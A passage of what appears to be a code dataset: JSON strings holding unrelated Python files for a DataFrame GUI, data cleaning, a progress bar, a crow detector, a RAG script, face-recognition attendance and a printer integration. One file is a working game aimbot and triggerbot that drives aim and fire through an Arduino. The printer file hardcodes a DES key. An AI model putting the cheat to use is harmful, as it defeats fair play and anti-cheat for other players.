window=self.scrollable_frame, anchor=\"nw\")\r\n        self.canvas.configure(yscrollcommand=self.scrollbar.set)\r\n\r\n        self.canvas.pack(side=\"left\", fill=\"both\", expand=True)\r\n        self.scrollbar.pack(side=\"right\", fill=\"y\")\r\n\r\n        self.bind(\"<Enter>\", self._bound_to_mousewheel)\r\n        self.bind(\"<Leave>\", self._unbound_to_mousewheel)\r\n\r\n    def _bound_to_mousewheel(self, event):\r\n        self.canvas.bind_all(\"<MouseWheel>\", self._on_mousewheel)\r\n\r\n    def _unbound_to_mousewheel(self, event):\r\n        self.canvas.unbind_all(\"<MouseWheel>\")\r\n\r\n    def _on_mousewheel(self, event):\r\n        self.canvas.yview_scroll(int(-1 * (event.delta / 120)), \"units\")\r\n\r\n\r\n\r\nclass DataFrame:\r\n    def __init__(self, rootWidget, dfs):\r\n        self.Dwidget = tb.Frame(rootWidget, bootstyle=\"secondary\")\r\n        self.style = Style()\r\n        self.dfs = dfs\r\n        self.filePaths={}\r\n        self.selectedFrame = tb.StringVar()\r\n        self.chose = tb.Combobox(self.Dwidget, textvariable=self.selectedFrame,state=\"readonly\")\r\n        self.chose.pack()\r\n        self.buttonsFrame = tb.Frame(self.Dwidget, bootstyle=\"secondary\")\r\n        self.buttonsFrame.pack(padx=5,pady=5)\r\n        self.importButton = tb.Button(self.buttonsFrame, text=\"Import DataFrame\", command=self.importDataFrame,width=100,style=\"info\")\r\n        self.importButton.pack(padx=5,pady=5)\r\n        self.editButton = tb.Button(self.buttonsFrame, text=\"Edit Frame\", command=self.editDataFrame, width=100,style=\"warning\")\r\n        self.editButton.pack(padx=5,pady=5)\r\n        self.exportButton = tb.Button(self.buttonsFrame, text=\"Export DataFrame\", command=self.export, width=100,style=\"success\")\r\n        self.exportButton.pack(padx=5,pady=5)\r\n        self.retrieveButton = tb.Button(self.buttonsFrame, text=\"Remove DataFrame\",command=self.removeDataFrame,width=100,style=\"danger\")\r\n        self.retrieveButton.pack(padx=5,pady=5)\r\n        self.buttonsFrame.grid_columnconfigure(0, weight=1)\r\n        self.buttonsFrame.grid_columnconfigure(1, weight=1)\r\n   ",
    "# -*- coding: utf-8 -*-\n\"\"\"API_6-Inconsistencias.ipynb\n\nAutomatically generated by Colab.\n\nOriginal file is located at\n    https://colab.research.google.com/drive/1BRl1LCtjdql6pYSsQCKGtKYsT7-cBzmt\n\"\"\"\n\n#Importando as bibliotecas\nimport pandas as pd #data manipulation\nimport matplotlib.pyplot as plt #plotting library\nimport numpy as np\n\n#Habilitando a abertura de dados que est\u00e3o no Google Drive\nfrom google.colab import drive\ndrive.mount('/content/drive')\n\n# Abrindo csv \"Tabela Unica Completa\"\nTabela_unica_completa = pd.read_csv('/content/drive/My Drive/Dados_API/Tabela_unica_completa.csv')\n\n# Filtrando as linhas onde 'Produtividade' \u00e9 igual a 200\nlinhas_produtividade_200 = Tabela_unica_completa[Tabela_unica_completa['Produtividade'] == 200]\n\n# Exibindo as linhas filtradas\nprint(linhas_produtividade_200)\n\n# Filtrando as linhas onde 'Produtividade' \u00e9 igual a 200\nlinhas_produtividade_200 = Tabela_unica_completa[Tabela_unica_completa['Produtividade'] == 200]\n\n# Alterando os valores das colunas 'Veiculo' e 'Qtd/pallets'\nlinhas_produtividade_200['Veiculo'] = 'P24'\nlinhas_produtividade_200['Qtd/pallets'] = 'P24'\nlinhas_produtividade_200['Capacidade'] = '3600'\nlinhas_produtividade_200['Produtividade'] = '100'\n\n\n# Exibindo as linhas com as altera\u00e7\u00f5es\nprint(linhas_produtividade_200)\n\n# Atualize o DataFrame original com as linhas modificadas\nTabela_unica_completa.loc[linhas_produtividade_200.index] = linhas_produtividade_200\n\n# Salve o DataFrame atualizado em um arquivo CSV\nTabela_unica_completa.to_csv('Tabela_unica_atualizada.csv', index=False)\n\n# Baixe o arquivo CSV para o seu sistema local\nfrom google.colab import files\nfiles.download('Tabela_unica_atualizada.csv')\n\n# Abrindo csv \"Tabela Novo DataFrame\"\nnovo_dataframe = pd.read_csv('/content/drive/My Drive/Dados_API/novo_dataframe.csv')\n\n# Filtrando as linhas onde 'Produtividade' \u00e9 igual a 200\nlinhas_produtividade_200 = novo_dataframe[novo_dataframe['Produtividade'] == 200]\n\n# Exibindo as linhas filtradas\nprint(linhas_produtividade_200)\n\n# Filtrando as linhas onde a coluna 'Incoterm' cont\u00e9m 'FOB' e a coluna 'Vlr.Frete' cont\u00e9m o valor maior que 0\nresultado = novo_dataframe[(novo_dataframe['Incoterm'].str.contains('FOB')) & (novo_dataframe['Vlr.Frete'] > 0)]\n\n# Exibindo apenas as colunas consultadas no resultado\nprint(resultado[['Incoterm', 'Vlr.Frete']])\n\nimport pandas as pd\n\n# Filtrando as linhas onde a coluna 'Incoterm' cont\u00e9m 'FOB' e a coluna 'Vlr.Frete' cont\u00e9m o valor maior que 0\nresultado = novo_dataframe[(novo_dataframe['Incoterm'].str.contains('FOB')) & (novo_dataframe['Vlr.Frete'] > 0)]\n\n# Substituindo os valores da coluna 'Incoterm' por 'CIF' para as linhas filtradas no resultado\nresultado['Incoterm'] = 'CIF'\n\n# Exibindo apenas as colunas 'Incoterm' e 'Vlr.Frete' do resultado\nprint(resultado[['Incoterm', 'Vlr.Frete']])\n\nimport pandas as pd\n\n# Filtrando as linhas onde a coluna 'Incoterm' cont\u00e9m 'FOB' e a coluna 'Vlr.Frete' cont\u00e9m o valor maior que 0\nresultado = novo_dataframe[(novo_dataframe['Incoterm'].str.contains('FOB')) & (novo_dataframe['Vlr.Frete'] > 0)]\n\n# Substituindo os valores da coluna 'Incoterm' por 'CIF' para as linhas filtradas no resultado\nresultado['Incoterm'] = 'CIF'\n\n# Salvando o novo dataframe em um arquivo CSV\nresultado.to_csv('novo_dataframe_alterado.csv', index=False)\n\n# Baixando o arquivo CSV para o ambiente local\nfrom google.colab import files\nfiles.download('novo_dataframe_alterado.csv')\n\n# Abrindo csv \"Tabela Novo DataFrame\"\nnovo_dataframe_alterado = pd.read_csv('/content/drive/My Drive/Dados_API/novo_dataframe_alterado.csv')\n\nprint (novo_dataframe_alterado)\n\n# Filtrando as linhas onde a coluna 'Incoterm' cont\u00e9m 'FOB' e a coluna 'Vlr.Frete' cont\u00e9m o valor maior que 0\nresultado = novo_dataframe_alterado[(novo_dataframe_alterado['Incoterm'].str.contains('FOB')) & (novo_dataframe_alterado['Vlr.Frete'] > 0)]\n\n# Exibindo apenas as colunas consultadas no resultado\nprint(resultado[['Incoterm', 'Vlr.Frete']])\n\n# Visualizar as inconsist\u00eancias corrigidas\n\n## Utilizar a Tabela 'Tabela_unica_inc'\n\n# Abrindo csv \"Tabela Unica Inc\"\nTabela_unica_inc = pd.read_csv('/content/drive/My Drive/Dados_API/Tabela_unica_inc.csv')\n\n# Inconsist\u00eancia relacionada ao tipo de ve\u00edculo\n\n# Filtrando as linhas onde 'Produtividade' \u00e9 igual a 200\nlinhas_produtividade_200 = Tabela_unica_inc[Tabela_unica_inc['Produtividade'] == 200]\n\n# Exibindo as linhas filtradas\nprint(linhas_produtividade_200)\n\n# Inconsist\u00eancia relacionada ao incoterm utilizado\n\n# Filtrando as linhas onde a coluna 'Incoterm' cont\u00e9m 'FOB' e a coluna 'Vlr.Frete' cont\u00e9m o valor maior que 0\nresultado = Tabela_unica_inc[(Tabela_unica_inc['Incoterm'].str.contains('FOB')) & (Tabela_unica_inc['Vlr.Frete'] > 0)]\n\n# Exibindo apenas as colunas consultadas no resultado\nprint(resultado)\n\n# Quantidade de erros por f\u00e1brica\n\n# Contagem de valores na coluna 'CO.Fabrica'\ncontagem_fabrica = resultado['CO.Fabrica'].value_counts()\n\n# Exibindo a contagem\nprint(contagem_fabrica)\n\n# Identificando qual rota apresentou mais esse",
    "from ultralytics import YOLO\r\nimport dxcam\r\nimport serial\r\nimport numpy as np\r\nimport winsound\r\nimport win32api\r\nimport time\r\nimport threading\r\nimport os\r\nimport json\r\nfrom scipy.spatial import KDTree\r\n\r\n\r\nwith open('settings.json', 'r') as file:\r\n    config = json.load(file)\r\n\r\nsens = config['sens']\r\nCOM = config['COM']\r\ntry:\r\n    Serial = serial.Serial(COM,1000000,timeout = 0) \r\nexcept:\r\n    raise Exception(\"The arduino is not connected to PC or the Arduino's COM port is wrong.\")\r\n\r\nDISPLAY_SCALE = config['DISPLAY_SCALE']\r\nfovX = config['fovX']\r\nfovY = config['fovY']\r\n\r\nscale = [fovX, fovY] #range detect\r\n\r\n# Calculate the center of the screenshot\r\nscreenshot_center = [scale[0]/2 , scale[1]/2]\r\ncamera            = dxcam.create(device_idx=0,output_idx=0,output_color=\"BGR\") \r\nregion            = (int((DISPLAY_SCALE[0]-scale[0])/2),int((DISPLAY_SCALE[1]-scale[1])/2),\r\n                    int((DISPLAY_SCALE[0]+scale[0])/2),int((DISPLAY_SCALE[1]+scale[1])/2))#region capture screen\r\nmodel             = YOLO(\"bestnew.engine\")\r\n\r\n\r\n\r\nTriggerbot=False #Triggerbot state\r\n\r\nTriggerbot_key=win32api.VkKeyScan(config['TriggerbotKey'])\r\n\r\nAimbot=False     #Aimbot state\r\nAimbot_key=win32api.VkKeyScan(config['AimbotKey'])\r\n\r\nAim_assist=False  #Aim_assist state\r\nAim_assist_key=win32api.VkKeyScan(config['AimassistKey'])\r\n\r\nFlick=False   #Flick state\r\nFlick_cd=True\r\nFlick_key=win32api.VkKeyScan(config['FlickKey'])\r\n\r\n\r\nFlick_delay = config['Flick_delay']\r\nlast_flick_time = 0\r\n\r\nShot_key=win32api.VkKeyScan(config['FireKey'])\r\n\r\nrunning=False\r\n\r\nctsx = (1.07437623) * ((sens) ** (-0.9936827126))/(DISPLAY_SCALE[0])*(1920)\r\nctsy = (1.07437623) * ((sens) ** (-0.9936827126))/(DISPLAY_SCALE[1])*(1080)\r\nsmooth=1.2\r\n\r\nif config['target']=='head': #'head' or 'body'\r\n    target_enemy=1\r\nelse:\r\n    target_enemy=0\r\n\r\ndef ProcessKeyPress():\r\n    global Aim_assist,Triggerbot,Aimbot,Flick,running,fovX,fovY,region\r\n    running=True\r\n    if win32api.GetAsyncKeyState(Aimbot_key)&0x8000 > 0: #Aimbot\r\n        Aim_assist = False\r\n        Flick      = False\r\n        Aimbot     = not Aimbot\r\n        if Aimbot:\r\n            winsound.PlaySound(os.path.join(os.path.dirname(__file__), 'sound', 'aimboton.wav'), winsound.SND_FILENAME | winsound.SND_ASYNC)\r\n        else:\r\n            Triggerbot=False\r\n            winsound.PlaySound(os.path.join(os.path.dirname(__file__), 'sound', 'aimbotoff.wav'), winsound.SND_FILENAME | winsound.SND_ASYNC)\r\n        time.sleep(0.2)\r\n    if win32api.GetAsyncKeyState(Aim_assist_key)&0x8000 > 0: #Aim_assist\r\n        Aim_assist = not Aim_assist\r\n        Triggerbot = False\r\n        Aimbot     = False  \r\n        Flick      = False\r\n        if Aim_assist:\r\n            winsound.PlaySound(os.path.join(os.path.dirname(__file__), 'sound', 'aimassiston.wav'), winsound.SND_FILENAME | winsound.SND_ASYNC)\r\n        else:\r\n            winsound.PlaySound(os.path.join(os.path.dirname(__file__), 'sound', 'aimassistoff.wav'), winsound.SND_FILENAME | winsound.SND_ASYNC)\r\n        time.sleep(0.2)\r\n    if win32api.GetAsyncKeyState(Triggerbot_key)&0x8000 > 0: #Triggerbot\r\n        Aim_assist = False\r\n        Triggerbot = not Triggerbot\r\n        Flick      = False\r\n        if Triggerbot:\r\n            winsound.PlaySound(os.path.join(os.path.dirname(__file__), 'sound', 'triggerboton.wav'), winsound.SND_FILENAME | winsound.SND_ASYNC)\r\n        else:\r\n            winsound.PlaySound(os.path.join(os.path.dirname(__file__), 'sound', 'triggerbotoff.wav'), winsound.SND_FILENAME | winsound.SND_ASYNC)\r\n        time.sleep(0.2)\r\n    if win32api.GetAsyncKeyState(Flick_key)&0x8000 > 0: #Flick\r\n        Aim_assist = False\r\n        Triggerbot = False\r\n        Aimbot     = False\r\n        Flick      = not Flick\r\n        \r\n        if Flick:\r\n            winsound.PlaySound(os.path.join(os.path.dirname(__file__), 'sound', 'flickon.wav'), winsound.SND_FILENAME | winsound.SND_ASYNC)\r\n        else:\r\n            winsound.PlaySound(os.path.join(os.path.dirname(__file__), 'sound', 'flickoff.wav'), winsound.SND_FILENAME | winsound.SND_ASYNC)\r\n        time.sleep(0.2)\r\n    if win32api.GetAsyncKeyState(0x26)&0x8000 > 0: #FovY++\r\n        fovY+=10\r\n        print(f\"fovY{fovY}\")\r\n        config['fovX'] = fovY\r\n        with open('settings.json', 'w') as file:\r\n            json.dump(config, file, indent=2)\r\n        region         = (int((DISPLAY_SCALE[0]-scale[0])/2),int((DISPLAY_SCALE[1]-fovY)/2),\r\n                    int((DISPLAY_SCALE[0]+scale[0])/2),int((DISPLAY_SCALE[1]+fovY)/2))#region capture screen\r\n        \r\n        time.sleep(0.2)\r\n    if  win32api.GetAsyncKeyState(0x26)&0x8000 > 0: #FovY--\r\n        fovY-=10\r\n        print(f\"fovY{fovY}\")\r\n        config['fovX'] = fovY\r\n        with open('settings.json', 'w') as file:\r\n            json.dump(config, file, indent=2)\r\n        region         = (int((DISPLAY_SCALE[0]-scale[0])/2),int((DISPLAY_SCALE[1]-fovY)/2),\r\n                    int((DISPLAY_SCALE[0]+scale[0])/2),int((DISPLAY_SCALE[1]+fovY)/2))#region capture screen\r\n        \r\n     ",
    "from .exceptions import (\n    EasyBarKeyError,\n    EasyBarStopIteration,\n    EasyBarFileNotFoundError,\n    EasyBarDecodeError,\n    EasyBarValueError,\n    EasyBarNotImplementedError,\n)\n\nimport shutil as _shutil\nfrom multiprocessing import Lock as _lock\nimport json\nfrom typing import Optional, Union\n\n\n# Global progress lock\nPROGRESS_LOCK = _lock()\n# Default colour sequence configuration file\nCOLOUR_CONFIG_FILE = '../config/colour_sequence.json'\n# Numeric type for int and float\nNumeric = Union[int, float]\n\n# ANSI escape sequences for console\n# text and background colours\ntry:\n    with open(COLOUR_CONFIG_FILE, 'r') as json_file:\n        COLOUR_SEQUENCE = json.load(json_file)\nexcept FileNotFoundError as e:\n    msg = f'Failed to load colour sequence file: {COLOUR_CONFIG_FILE}'\n\n    raise EasyBarFileNotFoundError(msg) from e\nexcept json.JSONDecodeError:\n    msg = f'Cannot decode colour sequence file: {COLOUR_CONFIG_FILE}'\n\n    raise EasyBarDecodeError(msg)\n\n\nclass Bar:\n\n    def __init__(self, total: Numeric, mode: str = 'default',\n                 prefix: Optional[str] = None, display: str = '\u2588',\n                 fill: str = ' ', margin: int = 2, boundary: str = '[]',\n                 colour: str = 'default', bg_colour: str = 'default'):\n        self._total = total\n\n        # Currently support percentage and fraction modes\n        if mode in ('default', 'fractional', 'f'):\n            self._mode = 'fractional'\n        elif mode in ('percentage', 'p'):\n            self._mode = 'percentage'\n        else:\n            msg = f'Invalid mode: {mode}'\n\n            raise EasyBarValueError(msg)\n\n        if prefix is None:\n            self._prefix = 'EasyBar: '\n        else:\n            self._prefix = prefix\n\n        self._display = display\n        self._fill = fill\n        self._margin = margin\n\n        # Boundary must be a pair of start and end characters\n        boundary_len = len(boundary)\n\n        if boundary_len != 2:\n            msg = (\n                'Boundary must be two characters, '\n                f'got {boundary_len}: {boundary}'\n            )\n\n            raise EasyBarValueError(msg)\n\n        self._boundary = boundary\n        self._colour = colour\n        self._bg_colour = bg_colour\n\n        self._progress = 0\n        self._is_complete = False\n\n    def __iter__(self):\n        return self\n\n    def __next__(self):\n        if self._progress >= self._total:\n            self._is_complete = True\n            print()\n\n            raise EasyBarStopIteration\n\n        self._window_size = self.get_window_size()\n        self.update()\n\n        return self._progress\n\n    def update(self, prog: Numeric):\n        \"\"\"Update the progress bar.\"\"\"\n        raise EasyBarNotImplementedError\n\n    def is_complete(self):\n        return self._is_complete\n\n    @staticmethod\n    def get_window_size():\n        return _shutil.get_terminal_size().columns\n\n    @staticmethod\n    def colour_txt(text: str, foreground: str = 'default',\n                   background: str = 'default') -> str:\n        foreground = foreground.lower()\n        background = background.lower()\n\n        if foreground not in COLOUR_SEQUENCE['foreground']:\n            msg = f'Invalid text colour: {foreground}'\n\n            raise EasyBarKeyError(msg)\n\n        if background not in COLOUR_SEQUENCE['background']:\n            msg = f'Invalid background colour: {background}'\n\n            raise EasyBarKeyError(msg)\n\n        txt_colour = COLOUR_SEQUENCE['foreground'][foreground]\n        bg_colour = COLOUR_SEQUENCE['background'][background]\n        reset = COLOUR_SEQUENCE['foreground']['reset']\n        coloured_text = txt_colour + bg_colour + text + reset\n\n        return coloured_text\n",
    "import preprocessing as pp\nimport postprocessing as post\nimport reporter as rep\nimport directory as dir\nimport imaging as im\nimport json\nimport os\nfrom keras import layers, models\nfrom datetime import datetime\n\nprint('')\n\n#Directories\ncoco_root = 'CoCoDataSet/'\ntensor_root = 'DataSetTensorFlowStructure/'\nannotation_dir = '_annotations.coco.json'\ntrain_dir = f'{coco_root}train/'\ntest_dir = f'{coco_root}test/'\nvalid_dir = f'{coco_root}valid/'\n\n#inladen JSON annotaties\ntrain_annotation = json.load(open(f'{train_dir}{annotation_dir}'))\ntest_annotation = json.load(open(f'{test_dir}{annotation_dir}'))\nvalid_annotation = json.load(open(f'{valid_dir}{annotation_dir}'))\n\n#ID nummers van geschikte foto's\ntrain_ids = pp.GetSingleCrowsIDs(train_annotation)\nprint(f'train_ids: {len(train_ids)}')\ntest_ids = pp.GetSingleCrowsIDs(test_annotation)\nprint(f'test_ids: {len(test_ids)}')\nvalid_ids = pp.GetSingleCrowsIDs(valid_annotation)\nprint(f'valid_ids: {len(valid_ids)}')\n\n#Paden naar afbeeldingen bij geschikte foto's\ntrain_paths = pp.GetListOfPaths(train_ids, train_annotation, train_dir)\ntest_paths = pp.GetListOfPaths(test_ids, test_annotation, test_dir)\nvalid_paths = pp.GetListOfPaths(valid_ids, valid_annotation, valid_dir)\n\n#Geschikte foto's van enkele kraaien\ntrain_images = pp.LoadImages(train_paths)\ntest_images = pp.LoadImages(test_paths)\nvalid_images = pp.LoadImages(valid_paths)\n\n#bijbehorende bounding boxes\ntrain_bbox = pp.GetBoundingBoxesByIDs(train_ids, train_annotation)\ntest_bbox = pp.GetBoundingBoxesByIDs(test_ids, test_annotation)\nvalid_bbox = pp.GetBoundingBoxesByIDs(valid_ids, valid_annotation)\n\n#gesorteerde id, foto's en bounding boxes\ntrain_IDS = train_images.keys()\ntrain_images_list = [train_images[id] for id in train_IDS]\ntrain_bbox_list  = [train_bbox[id] for id in train_IDS]\n\ntest_IDS  = test_images.keys()\ntest_images_list = [test_images[id] for id in test_IDS]\ntest_bbox_list  = [test_bbox[id] for id in test_IDS]\n\nvalid_IDS = valid_images.keys()\nvalid_images_list = [valid_images[id] for id in valid_IDS]\nvalid_bbox_list  = [valid_bbox[id] for id in valid_IDS]\n\n#convert bounding box to numpy arrays\nnumpy_train_images = pp.PillowImageArrayToNumpyArray(train_images_list, False)\nnumpy_train_bbox_list = pp.BoundingBoxesToNumpyArray(train_bbox_list)\n\nnumpy_test_images = pp.PillowImageArrayToNumpyArray(test_images_list, False)\nnumpy_test_bbox_list = pp.BoundingBoxesToNumpyArray(test_bbox_list)\n\nnumpy_valid_images = pp.PillowImageArrayToNumpyArray(valid_images_list, False)\nnumpy_valid_bbox_list = pp.BoundingBoxesToNumpyArray(valid_bbox_list)\n\nimg_height = 640\nimg_width = 640\nbatch_size = 16\n\n#creation model\ncrowDar = models.Sequential([\n\n    layers.Conv2D(32, (3, 3), activation='relu', padding='same'),\n    layers.MaxPooling2D(2, 2),\n\n    layers.Conv2D(64, (3, 3), activation='relu', padding='same'),\n    layers.MaxPooling2D(2, 2),\n\n    layers.Conv2D(128, (3, 3), activation='relu', padding='same'),\n    layers.MaxPooling2D(2, 2),\n\n    layers.Conv2D(256, (3, 3), activation='relu', padding='same'),\n    layers.MaxPooling2D(2, 2),\n\n    layers.Conv2D(512, (3, 3), activation='relu', padding='same'),\n    layers.MaxPooling2D(2, 2),\n\n    # Flattening the output to feed into Dense layers\n    layers.Flatten(),\n\n    # Dense layers for feature interpretation\n    layers.Dense(512, activation='relu'),\n    layers.Dropout(0.33),  # Increased dropout for regularization\n\n    # Output layer for bounding box prediction - 4 neurons for [x_center, y_center, width, height]\n    layers.Dense(4, activation=None)  # Consider removing the activation or using 'linear' if working with unbounded coordinates\n])\n\n\ncrowDar.compile(optimizer='adam',\n              loss = 'mean_absolute_error',\n              metrics=['accuracy'])\n\nfor image in numpy_test_images:\n    pp.AppendImageToNumpyArray(numpy_train_images, image)\n\nfor bbox in numpy_test_bbox_list:\n    pp.AppenBoundingBoxToNumpyArray(numpy_train_bbox_list, bbox)\n\n#fill with prime numbers\ncrow_epochs = [5, 10, 25, 50]\n# Get the current date and time\nnow = datetime.now()\ndate_time = now.strftime(\"%Y-%m-%d_%H-%M-%S\")\n\nfor epoch in crow_epochs:\n    start_time = datetime.now() \n    # create a unique directory for each epoch\n    unique_dir_name = dir.create_unique_result_directory(epoch, date_time)\n    # fit/train the model\n    H = crowDar.fit(numpy_train_images, numpy_train_bbox_list, epochs = epoch, batch_size=batch_size, validation_data=(numpy_valid_images, numpy_valid_bbox_list))\n    validation_loss = crowDar.evaluate(numpy_valid_images, numpy_valid_bbox_list)\n    S = crowDar.summary()\n\n    # Assuming `numpy_valid_images` is your validation set images and the model is named `smallModel`\n    predictions = crowDar.predict(numpy_valid_images)\n    average = 0\n    counter = 0\n    for i in range(len(numpy_valid_images)):\n        iou = post.CalculateIoUNEW(predictions[i], numpy_valid_bbox_list[i])\n        counter += 1\n        average += iou\n        im.draw_bounding_boxes(i, iou, numpy_valid_images[i], numpy_val",
    "import argparse\nfrom dataclasses import dataclass\nfrom langchain.vectorstores.chroma import Chroma\n# from langchain.embeddings import OpenAIEmbeddings\nfrom langchain_community.embeddings import HuggingFaceInferenceAPIEmbeddings\n# from langchain.chat_models import ChatOpenAI\nfrom langchain.prompts import ChatPromptTemplate\n\nfrom langchain_community.llms import Ollama\nfrom langchain.callbacks.manager import CallbackManager\nfrom langchain.callbacks.streaming_stdout import StreamingStdOutCallbackHandler\n\nCHROMA_PATH = \"chroma\"\n\n\nPROMPT_TEMPLATE = \"\"\"\nYou are a computer science developer well adept in programming with languages like java, python and are very adept at \nmaking detailed documentation on your work. Based on the context given below answer the presented question with a detailed \nresponse on the features functionalities and any specific requests related to the question.\nContext:\n{context}\n\n---\n\nAnswer the question based on the above context: {question}\n\"\"\"\n\ninference_api_key=\"YOUR API KEY HERE\"\n\n\ndef main():\n    # Create CLI.\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"query_text\", type=str, help=\"The query text.\")\n    args = parser.parse_args()\n    query_text = args.query_text\n\n    # Prepare the DB.\n    embeddings = HuggingFaceInferenceAPIEmbeddings(\n        api_key=inference_api_key, model_name=\"sentence-transformers/all-MiniLM-l6-v2\"\n    )\n    db = Chroma(persist_directory=CHROMA_PATH, embedding_function=embeddings)\n\n    # Search the DB.\n    results = db.similarity_search_with_relevance_scores(query_text, k=3)\n    # if len(results) == 0 or results[0][1] < 0.5:\n    if len(results) == 0:\n        print(f\"Unable to find matching results.\")\n        return\n\n    context_text = \"\\n\\n---\\n\\n\".join([doc.page_content for doc, _score in results])\n    prompt_template = ChatPromptTemplate.from_template(PROMPT_TEMPLATE)\n    prompt = prompt_template.format(context=context_text, question=query_text)\n\n    #model = ChatOpenAI()\n    #response_text = model.predict(prompt)\n\n    #sources = [doc.metadata.get(\"source\", None) for doc, _score in results]\n    #formatted_response = f\"Response: {response_text}\\nSources: {sources}\"\n    #print(formatted_response)\n\n    llm = Ollama(model=\"llama2\", callback_manager=CallbackManager([StreamingStdOutCallbackHandler()]))\n    llm.invoke(prompt)\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "from sklearn.neighbors import KNeighborsClassifier\nimport cv2\nimport pickle\nimport numpy as np\nimport os\nimport csv\nimport time\nfrom datetime import datetime\n\n\nfrom win32com.client import Dispatch\n\ndef speak(str1):\n    speak=Dispatch((\"SAPI.SpVoice\"))\n    speak.Speak(str1)\n\nvideo=cv2.VideoCapture(0)\nfacedetect=cv2.CascadeClassifier('data/haarcascade_frontalface_default.xml')\n\nwith open('data/names.pkl', 'rb') as w:\n    LABELS=pickle.load(w)\nwith open('data/faces_data.pkl', 'rb') as f:\n    FACES=pickle.load(f)\n\nprint('Shape of Faces matrix --> ', FACES.shape)\n\nknn=KNeighborsClassifier(n_neighbors=5)\nknn.fit(FACES, LABELS)\n\nimgBackground=cv2.imread(\"background.png\")\n\nCOL_NAMES = ['NAME', 'TIME']\n\nwhile True:\n    ret,frame=video.read()\n    gray=cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)\n    faces=facedetect.detectMultiScale(gray, 1.3 ,5)\n    for (x,y,w,h) in faces:\n        crop_img=frame[y:y+h, x:x+w, :]\n        resized_img=cv2.resize(crop_img, (50,50)).flatten().reshape(1,-1)\n        output=knn.predict(resized_img)\n        ts=time.time()\n        date=datetime.fromtimestamp(ts).strftime(\"%d-%m-%Y\")\n        timestamp=datetime.fromtimestamp(ts).strftime(\"%H:%M-%S\")\n        exist=os.path.isfile(\"Attendance/Attendance_\" + date + \".csv\")\n        cv2.rectangle(frame, (x,y), (x+w, y+h), (0,0,255), 1)\n        cv2.rectangle(frame,(x,y),(x+w,y+h),(50,50,255),2)\n        cv2.rectangle(frame,(x,y-40),(x+w,y),(50,50,255),-1)\n        cv2.putText(frame, str(output[0]), (x,y-15), cv2.FONT_HERSHEY_COMPLEX, 1, (255,255,255), 1)\n        cv2.rectangle(frame, (x,y), (x+w, y+h), (50,50,255), 1)\n        attendance=[str(output[0]), str(timestamp)]\n    imgBackground[162:162 + 480, 55:55 + 640] = frame\n    cv2.imshow(\"Frame\",imgBackground)\n    k=cv2.waitKey(1)\n    if k==ord('o'):\n        speak(\"Attendance Taken..\")\n        time.sleep(5)\n        if exist:\n            with open(\"Attendance/Attendance_\" + date + \".csv\", \"+a\") as csvfile:\n                writer=csv.writer(csvfile)\n                writer.writerow(attendance)\n            csvfile.close()\n        else:\n            with open(\"Attendance/Attendance_\" + date + \".csv\", \"+a\") as csvfile:\n                writer=csv.writer(csvfile)\n                writer.writerow(COL_NAMES)\n                writer.writerow(attendance)\n            csvfile.close()\n    if k==ord('q'):\n        break\nvideo.release()\ncv2.destroyAllWindows()\n\n",
    "import aiohttp\r\nimport async_timeout\r\nimport json\r\nfrom homeassistant.config_entries import ConfigEntry\r\nfrom homeassistant.core import HomeAssistant\r\nfrom homeassistant.helpers.update_coordinator import DataUpdateCoordinator, UpdateFailed\r\nfrom datetime import timedelta\r\nimport logging\r\nfrom Crypto.Cipher import DES\r\nfrom Crypto.Util.Padding import pad\r\nfrom base64 import b64encode\r\nfrom binascii import unhexlify\r\n\r\nfrom .const import DOMAIN\r\n\r\n_LOGGER = logging.getLogger(__name__)\r\n\r\nasync def async_setup_entry(hass: HomeAssistant, entry: ConfigEntry) -> bool:\r\n    session = aiohttp.ClientSession()\r\n    coordinator = CrealityDataCoordinator(hass, session, entry.data)\r\n    await coordinator.async_config_entry_first_refresh()\r\n\r\n    hass.data.setdefault(DOMAIN, {})[entry.entry_id] = coordinator\r\n    hass.async_create_task(hass.config_entries.async_forward_entry_setup(entry, 'sensor'))\r\n    hass.async_create_task(hass.config_entries.async_forward_entry_setup(entry, 'button'))\r\n    return True\r\n\r\nclass CrealityDataCoordinator(DataUpdateCoordinator):\r\n    def __init__(self, hass, session, config):\r\n        self.session = session\r\n        self.config = config\r\n        super().__init__(hass, _LOGGER, name=DOMAIN, update_interval=timedelta(seconds=30))\r\n\r\n    async def _async_update_data(self):\r\n        data = await self.fetch_data()\r\n        if data is None:\r\n            raise UpdateFailed(\"Failed to fetch data from the Creality printer.\")\r\n        return data\r\n\r\n    async def fetch_data(self):\r\n        uri = f\"ws://{self.config['host']}:{self.config['port']}/\"\r\n        token = self.generate_token(self.config['password'])\r\n        async with self.session.ws_connect(uri) as ws:\r\n            await ws.send_json({\"cmd\": \"GET_PRINT_STATUS\", \"token\": token})\r\n            async with async_timeout.timeout(10):\r\n                msg = await ws.receive_json()\r\n                if msg:\r\n                    return msg\r\n                else:\r\n                    _LOGGER.error(\"Failed to receive data\")\r\n                    return None\r\n\r\n    def generate_token(self, password):\r\n        key = unhexlify(\"6138356539643638\")\r\n        cipher = DES.new(key[:8], DES.MODE_ECB)\r\n        padded_password = pad(password.encode(), DES.block_size)\r\n        encrypted_password = cipher.encrypt(padded_password)\r\n        token = b64encode(encrypted_password).decode('utf-8')\r\n        return token\r\n\r\n    async def send_command(self, command):\r\n        \"\"\"Send a command to the printer.\"\"\"\r\n        uri = f\"ws://{self.config['host']}:{self.config['port']}/\"\r\n        token = self.generate_token(self.config['password'])\r\n        \r\n        try:\r\n            async with self.session.ws_connect(uri) as ws:\r\n                await ws.send_json({\"cmd\": command, \"token\": token})\r\n                _LOGGER.info(f\"Sent command {command} to the printer\")\r\n                response = await ws.receive()\r\n                \r\n                if response.type == aiohttp.WSMsgType.TEXT:\r\n                    response_data = json.loads(response.data)\r\n                    if response_data.get(\"cmd\") == command and response_data.get(\"status\") == command:\r\n                        _LOGGER.info(f\"Command {command} executed successfully.\")\r\n                    else:\r\n                        _LOGGER.error(f\"Printer responded with unexpected data: {response_data}\")\r\n                else:\r\n                    _LOGGER.error(f\"Failed to receive valid response for command {command}\")\r\n                    \r\n        except Exception as e:\r\n            _LOGGER.error(f\"Failed to send command {command}: {e}\")\r\n",
